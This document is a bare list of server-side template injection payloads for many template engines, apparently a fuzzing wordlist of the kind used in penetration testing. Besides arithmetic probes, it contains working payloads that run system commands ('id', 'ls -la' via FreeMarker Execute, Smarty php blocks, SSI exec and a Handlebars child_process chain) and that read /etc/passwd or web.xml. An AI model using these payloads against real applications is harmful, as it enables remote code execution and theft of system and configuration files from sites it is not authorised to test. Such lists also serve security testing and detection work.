[[${77*77}]]
${{77*77}}
${77*77}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../WEB-INF/web.xml").getContent()}
${''.constructor.constructor('return Error().stack')()}
${#ctx.getClass()}
${"freemarker.template.utility.Execute"?new()("id")}
${__import__("traceback").format_stack()}
{$smarty.version}
${T(java.lang.System).getenv()}
${xyz|77*77}
#{77*77}
*{77*77}
<%= 77*77 %>
<%=77*77%>
@(77*77)
[[77*77]]
{{'77'*77}}
{{=77*77}}
{{{77*77}}}
{{77*77}}
{77*77}
{{app.request.server.all|join(',')}}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}
<#assign xy="zxxxxxxz"><#assign yx="zyyyyyyz">${yx}${xy}
{{[].__class__.__base__.__subclasses__()}}
{{[].class.base.subclasses()}}
{{''.class.mro()[1].subclasses()}}
{{''.__class__.__mro__[2].__subclasses__()}}
{{constant('Twig_Environment::VERSION')}}
#{''.constructor.constructor('return Error().stack')()}
<%=''.constructor.constructor('return Error().stack')()%>
{{''.constructor.constructor('return Error().stack')()}}
{% debug %}
{{dump(app)}}
{{'/etc/passwd'|file_excerpt(1,30)}}
{% for c in [1,2,3] %}{{c,c,c}}{% endfor %}
{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Sized'%}{{c.__len__.__globals__['__builtins__']['__import__']('traceback').format_stack()}}{%endif%}{%endfor%}
#{__import__("traceback").format_stack()}
<%__import__("traceback").format_stack()%>
{{__import__("traceback").format_stack()}}
{php}$s = file_get_contents('/etc/passwd', NULL, NULL,0, 100);var_dump($s);{/php}
{php}echo `id`;{/php}
{php}print "Hello"{/php}
<pre>{% debug %}</pre>
<p th:text='${#ctx.getClass()}'></p>
{{self}}
#set($x=77*77)${x}
"-->'-->`--><!--#set var="suc" value="rtb97y3o64"--><!--#set var="uwe" value="tvdb905q86"--><!--#echo var="suc"--><!--#echo var="uwe"--><!--#exec cmd="id" -->
{{this}}
{{this.constructor.constructor}}
{{this.constructor.constructor('process.pid')()}}
{{this.__proto__}}
{{this.__proto__.constructor.name}}
#{Thread.current.backtrace}
<%=Thread.current.backtrace%>
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('ls -la');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
